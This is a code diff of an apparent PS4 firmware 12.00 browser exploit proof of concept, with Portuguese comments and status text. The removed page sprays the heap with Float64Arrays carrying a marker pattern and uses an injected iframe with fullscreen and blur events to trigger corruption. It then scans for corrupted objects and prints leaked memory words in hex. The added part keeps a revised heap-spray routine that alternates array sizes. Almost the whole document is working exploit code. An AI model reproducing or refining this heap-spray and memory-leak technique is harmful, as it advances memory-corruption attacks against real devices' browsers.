@@ -1,117 +1,19 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <title>PS4 Success Replica - Leandro</title>
-</head>
-<body style="background-color: #f4f4f9; font-family: sans-serif; padding: 20px;">
-
-    <h1>PS4 12.00 - Persistence & Memory Leak</h1>
-    <p>Status: <span id="status-pai" style="font-weight:bold;">Aguardando Preparação...</span></p>
-
-    <button onclick="prepareObjects()" style="padding: 12px;">1. Preparar Objetos (Pai)</button>
-    <button onclick="setupIframe()" style="padding: 12px;">2. Injetar Iframe de Gatilho</button>
-    <button onclick="checkPersistence()" style="padding: 12px; background-color: #c8e6c9;">3. Verificar e Vazar Memória</button>
-
-    <hr>
-    <div id="leak-output" style="background: #222; color: #0f0; padding: 15px; font-family: monospace; display: none; border-radius: 5px;">
-        </div>
-
-    <div id="frame-container" style="margin-top: 20px;"></div>
-
-    <script>
-        const PATTERN = 2.121995791e-314; // 0x4141414141414141
-        let controllers = [];
-        const statusPai = document.getElementById('status-pai');
-        const leakOutput = document.getElementById('leak-output');
-
-        // PASSO 1: Exatamente como no teste que funcionou
-        function prepareObjects() {
-            controllers = [];
-            for(let i = 0; i < 5000; i++) {
-                let arr = new Float64Array(8);
-                arr[0] = i; 
-                controllers.push(arr);
-            }
-            statusPai.innerText = "5000 Objetos prontos. Use o Iframe.";
-            statusPai.style.color = "blue";
-            leakOutput.style.display = "none";
+<script>
+    // ... dentro do onblur do Iframe ...
+    window.onblur = function() {
+        let spray = [];
+        for(let i = 0; i < 8000; i++) {
+            // Alternamos entre tamanho 10 e 16
+            let size = (i % 2 === 0) ? 10 : 16;
+            let p = new Float64Array(size);
+            p.fill(PATTERN); 
+            spray.push(p);
         }
-
-        // PASSO 2: Exatamente como no teste que funcionou
-        function setupIframe() {
-            const container = document.getElementById('frame-container');
-            container.innerHTML = '<iframe id="pocFrame" style="width:100%; height:150px; border:1px solid red;"></iframe>';
-            
-            const frame = document.getElementById('pocFrame');
-            const fDoc = frame.contentWindow.document;
-
-            fDoc.open();
-            fDoc.write(`
-                <html>
-                <body>
-                    <button onclick="startPoC()" style="padding:10px;">START (FULLSCREEN + OPTIONS)</button>
-                    <script>
-                        window.startPoC = function() {
-                            if (document.documentElement.webkitRequestFullscreen) 
-                                document.documentElement.webkitRequestFullscreen();
-                            
-                            window.onblur = function() {
-                                let spray = [];
-                                for(let i = 0; i < 8000; i++) {
-                                    let p = new Float64Array(10);
-                                    p.fill(${PATTERN});
-                                    spray.push(p);
-                                }
-                                setTimeout(() => {
-                                    document.open();
-                                    document.write('<h1>FRAME FINALIZADO</h1>');
-                                    document.close();
-                                }, 1000);
-                            };
-                        };
-                    <\/script>
-                </body>
-                </html>
-            `);
-            fDoc.close();
-            statusPai.innerText = "Iframe Pronto. Sequência: FS -> OPTIONS.";
-        }
-
-        // PASSO 3: Verificação idêntica à da foto de sucesso
-        function checkPersistence() {
-            let corrupted = null;
-            let corruptedIndex = -1;
-
-            for(let i = 0; i < controllers.length; i++) {
-                if (controllers[i][0] === PATTERN) {
-                    corrupted = controllers[i];
-                    corruptedIndex = i;
-                    break;
-                }
-            }
-
-            if (corrupted) {
-                statusPai.innerHTML = "<span style='color:green;'>✓ SUCESSO: Memória Corrompida no ID: " + corruptedIndex + "</span>";
-                leakOutput.style.display = "block";
-                leakOutput.innerHTML = "<b>[ MEMORY LEAK DETECTED ]</b><br><br>";
-
-                for(let i = 0; i < 8; i++) {
-                    const val = corrupted[i];
-                    const buf = new ArrayBuffer(8);
-                    new Float64Array(buf)[0] = val;
-                    const hex = new BigUint64Array(buf)[0].toString(16).padStart(16, '0');
-                    
-                    // Destaca se aparecer algo diferente de zero ou 414141
-                    let isInteresting = (hex !== "0000000000000000" && !hex.includes("414141"));
-                    let style = isInteresting ? "color:#fff; background:#a00;" : "";
-                    
-                    leakOutput.innerHTML += "Offset [" + i + "]: <span style='" + style + "'>0x" + hex + "</span><br>";
-                }
-            } else {
-                statusPai.innerHTML = "<span style='color:red;'>✗ FALHA: Corrupção não detectada. Reinicie o navegador.</span>";
-            }
-        }
-    </script>
-</body>
-</html>
+        
+        setTimeout(() => {
+            document.open();
+            document.write('<h1>FRAME FINALIZADO</h1>');
+            document.close();
+        }, 1000);
+    };
+</script>
